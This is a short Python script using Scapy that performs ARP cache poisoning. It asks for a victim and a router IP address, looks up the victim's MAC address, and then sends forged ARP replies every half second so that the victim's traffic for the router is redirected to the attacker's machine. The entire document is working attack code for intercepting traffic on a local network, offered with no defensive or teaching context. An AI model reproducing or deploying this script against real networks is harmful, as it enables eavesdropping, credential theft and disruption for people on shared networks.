from scapy.all import ARP, send, sr1
from time import sleep

victim = raw_input("Victim IP Address: ")
router = raw_input("Router IP Address: ")

def ARP_Who_Has(IPAddress):
    ARPPkt = sr1(ARP(op=1, pdst=IPAddress), verbose=False)
    return ARPPkt[0][ARP].hwsrc

def ARP_Is_At(VictimIP, VictimBIA, RouterIP):
    send(ARP(op=2, psrc=RouterIP, pdst=VictimIP, hwdst=VictimBIA), count=1)

victim_BIA = ARP_Who_Has(victim)

while True:
    ARP_Is_At(victim, victim_BIA, router)
    sleep(0.5)
